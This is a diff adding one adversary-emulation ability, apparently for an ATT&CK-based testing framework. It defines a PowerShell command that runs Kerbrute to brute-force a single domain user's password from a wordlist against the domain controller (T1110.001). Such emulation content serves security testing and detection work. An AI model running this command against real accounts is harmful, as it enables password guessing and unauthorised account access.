@@ -1,0 +1,19 @@
+- description: 'Bruteforce a single user''s password from a wordlist
+
+    '
+  id: dcf01b96aca3771f0afc86357cbe5c6d
+  name: Password Brute User using Kerbrute Tool
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: cd $env:temp; .\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d
+          $ENV:userdomain $env:temp\bruteuser.txt TestUser1
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1110.001
+    name: 'Brute Force: Password Guessing'
